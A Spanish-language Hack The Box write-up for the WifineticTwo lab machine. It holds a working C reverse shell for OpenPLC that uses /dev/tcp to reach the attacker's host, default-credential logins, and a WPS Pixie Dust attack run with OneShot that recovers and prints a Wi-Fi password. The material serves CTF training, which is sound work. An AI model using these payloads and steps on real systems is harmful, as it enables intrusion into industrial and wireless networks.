---
layout: single
title: WifineticTwo - Hack The Box
excerpt: ""
date: 2024-6-4
classes: wide
header:
  teaser: /assets/images/htb-writeup-wifinetictwo/wifinetictwo_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - SSTI

---

![](/assets/images/htb-writeup-wifinetictwo/wifinetictwo_logo.png)

# PortScan
____

```bash
# Nmap 7.94SVN scan initiated Mon Jun  3 19:18:11 2024 as: nmap -sCV -p22,8080 -oN targeted 10.10.11.7
Nmap scan report for 10.10.11.7
Host is up (0.074s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zl5POg.KeH7WkVEsr_izz0NnIRZuSZ4uIw; Expires=Mon, 03-Jun-2024 23:23:18 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 03 Jun 2024 23:18:18 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zl5POQ.UlY1K1jV76GqzIPaDdEWOgp0cXU; Expires=Mon, 03-Jun-2024 23:23:17 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 03 Jun 2024 23:18:17 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zl5POg.KeH7WkVEsr_izz0NnIRZuSZ4uIw; Expires=Mon, 03-Jun-2024 23:23:18 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 03 Jun 2024 23:18:18 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/3%Time=665E4F3A%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\.
SF:0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZnJ
SF:lc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.Zl5POQ\.UlY1K1jV76GqzIPaDdEWOg
SF:p0cXU;\x20Expires=Mon,\x2003-Jun-2024\x2023:23:17\x20GMT;\x20HttpOnly;\
SF:x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x2
SF:0Mon,\x2003\x20Jun\x202024\x2023:18:17\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Redi
SF:recting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20
SF:be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20href
SF:=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%r
SF:(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html;
SF:\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Coo
SF:kie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.Zl5POg\.KeH7W
SF:kVEsr_izz0NnIRZuSZ4uIw;\x20Expires=Mon,\x2003-Jun-2024\x2023:23:18\x20G
SF:MT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkze
SF:ug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Mon,\x2003\x20Jun\x202024\x20
SF:23:18:18\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20
SF:request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\nconte
SF:nt-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>40
SF:0\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20r
SF:equest\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404\
SF:x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncont
SF:ent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcGV
SF:ybWFuZW50Ijp0cnVlfQ\.Zl5POg\.KeH7WkVEsr_izz0NnIRZuSZ4uIw;\x20Expires=Mo
SF:n,\x2003-Jun-2024\x2023:23:18\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver:
SF:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Mon,\x2003\x20Jun\x
SF:202024\x2023:18:18\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3
SF:C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</tit
SF:le>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x2
SF:0found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x
SF:20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20agai
SF:n\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  3 19:18:33 2024 -- 1 IP address (1 host up) scanned in 21.89 seconds
```


  
Nos reporta tan sólo dos puertos abiertos, la versión **SSH** no es vulnerable a enumerar posibles usuarios, que es de la 7.7 para abajo, así que procedo a mirar el sitio web de Python, en el **:8080**.


# Sitio Web

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604090513.png)

Me da por curiosear de "**¿qué es OpenPLC?**", descubriendo qué es una amalgama de proyectos de código abierto para ofrecer un PLC funcional tanto el software como hardware, como una alternativa de bajo costo para la automatización y la investigación.

También busqué por posibles vulnerabilidades, por lo qué encontré la vulnerabilidad "**CVE-2021-31630**", con su respectivo [PoC](https://github.com/thewhiteh4t/cve-2021-31630) para explotar la vulnerabilidad automáticamente, pero necesitaba saber credenciales válidas, por eso también hice una busqueda rápida de posibles credenciales default para **OpenPLC**, encontrándome rápidamente en la primera búsqueda algo obvio.
```json
username:openplc
password:openplc
```

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604090952.png)

logrando acceso al **OpenPLC**, ya en este punto sabiendo las credenciales podría utilizar el exploit mencionado más arriba [ESTE](https://github.com/thewhiteh4t/cve-2021-31630) para de manera automatizada obtener nuestra Reverse Shell, pero yo lo haré manual...

Indagando en los distintos directorios del **OpenPLC**, descubrí qué podemos subir código en **C** personalizado en el apartado de "**HARDWARE**", y luego correrlo, primero busco una **Reverse Shell** en el lenguaje C, encontrando éste:

```bash
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
}

void updateCustomIn()
{
}

#define LHOST "10.10.x.x" //aquí la IP de tu HOST
#define LPORT "443" // Puerto en escucha

void updateCustomOut()
{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        wait(NULL);
    }
}
```

una vez colocada la IP de mi HOST & el puerto donde estaré en escucha, hacemos éstos pasos:

1. Nos ponemos en escucha con Netcat.
```bash
nc -nlvp PORT
```

2. Guardamos el código cambiado. **(En Blank Linux)**

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604095058.png)

esto procederá a compilar el código, y sí pusimos todo bien lo hará correctamente, ahora volvemos al **Dashboard**.

3. Iniciamos el PLC.
   
![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604095240.png)

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604095320.png)

Hemos entablado conexión perfectamente, ya sólo quedaría darle [Tratamiento a la TTY](https://4uli.github.io/tratamiento-tty/#)

# Escalada de Privilegios.

Vemos que estamos como **ROOT**, lo cual de primera me da la impresión que estamos en un contenedor, pero hago "**ifconfig**", descubriendo que estamos en una máquina que no es la objetivo, por lo que tendremos que hacer movimiento lateral para pasar a esta máquina, y también descubrimos una interfaz wifi, lo cual de primeras me parece raro, ya qué esto no se suele ver en CTF's en HTB.

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604100509.png)

me da por curiosear en esta interfaz "**wlan0**" con la herramienta "**iwlist**"
```bash
iwlist wlan0 scan
```

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604100943.png)

que por el nombre del **ESSID** intuyo que es un Router, y por el protocolo de seguridad **WPA2 V1** podría aprovecharme de esto para explotar una vulnerabilidad que hay en el intercambio de claves de protocolos **WPS**, permitiéndome ver la clave en texto claro del WIFI.

Para ello utilizaremos la herramienta **OneShot** para llevar a cabo la explotación.
En nuestra máquina, obtenemos el exploit.
```bash
https://raw.githubusercontent.com/kimocoder/OneShot/master/oneshot.py
python3 -m http.server 80
```
Nos montamos un servidor en python, para descargar el recurso desde la máquina víctima.
```bash
curl 10.10.x.x/oneshot.py > oneshot.py
```

Una vez tengamos el exploit, lo ejecutamos con los siguientes parámetros:
```bash
oneshot.py -b 02:00:00:00:01:00 -i wlan0 -K
```

**-b:** Indicamos el MAC del ADDRES, que lo vimos con "**iwlist**".

**-i:** Indicamos la interfaz de la RED WIFI.

**-K:** Indicamos el tipo de ataque.

obteniendo el **PIN** & **contraseña** de la Red Wifi.

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604104402.png)

Me conecto a la red con las credenciales con la herramienta **"wpa"**, pero debemos hacer unos ajustes antes de...

1. Vamos a **"/etc/wpa_supplicant/"** de la máquina víctima nos creamos un archivo con nombre  "**wpa_supplicant-wlan0.conf**"
	```bash
vim wpa_supplicant-wlan0.conf
```

que contendrá lo siguiente:
```bash
ctrl_interface_group=0
update_config=1

network={
  ssid="plcrouter"
  psk="NoWWEDoKnowWhaTisReal123!"
  key_mgmt=WPA-PSK
  proto=WPA2
  pairwise=CCMP TKIP
  group=CCMP TKIP
  scan_ssid=1
}
```

2. Nos creamos este archivo "**/etc/systemd/network/25-wlan.network**":
```bash
vim /etc/systemd/network/25-wlan.network
```
	
con esto:
```bash
[Match]
Name=wlan0

[Network]
DHCP=ipv4
```

3. Activamos el "**wpa_service**"
```bash
systemctl enable wpa_supplicant@wlan0.service
```

4. Reiniciamos éstos servicios:
```bash
systemctl restart systemd-networkd.service
systemctl restart wpa_supplicant@wlan0.service
```

y con esto estaríamos conectado a la red "**plcrouter**", podemos corroborarlo viendo la IP de la interfaz "**wlan0**" con "**ifconfig**", que antes no se veía.

ahora que estamos conectados al wifi de "**plcrouter**", hacemos un barrido con "**arp -a**" para un escaneo rápido, descubriendo esto...

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604110852.png)

un **gateway**, es decir un punto de acceso entre dos redes... indagué en internet buscando posibles credenciales por defecto para router con sistema **PLC**, encontrando [ESTA WEB](https://www.192-168-1-1-ip.co/plc-systems/routers/1340/)
qué nos dice que las credenciales por defecto son usuario "**admin**" y contraseña "**admin**", esto no funcionó, pero probé con usuario "**root**" logrando así acceso esto por **SSH**, y con la **IP** evidentemente del **gateway**, para pasar este punto de acceso.

![](/assets/images/htb-writeup-wifinetictwo/Pasted image 20240604111754.png)

NOTA: Esto desde la máquina víctima, ya qué sólo ellas se pueden ver en la Red, desde mi máquina atacante evidentemente no.
